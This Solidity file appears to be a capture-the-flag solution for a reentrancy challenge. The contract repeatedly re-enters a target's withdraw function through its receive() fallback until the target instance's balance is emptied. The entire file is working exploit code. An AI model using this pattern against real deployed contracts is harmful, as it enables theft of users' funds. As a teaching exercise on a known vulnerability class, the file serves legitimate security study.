// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./interfaces/11_IReentrancy.sol";

address constant INSTANCE = 0xEe76035994ED17e93A8097370Ac8C1Efb11bF80C;

contract ReentrancySolution {
    IReentrancy instance = IReentrancy(INSTANCE);
    uint256 amount;

    function solve() external payable {
        amount = address(INSTANCE).balance;
        instance.donate{value: amount}(address(this));
        instance.withdraw(amount);
    }

    receive() external payable {
        if (address(INSTANCE).balance == 0) {
            return;
        }
        
        instance.withdraw(amount);
    }
}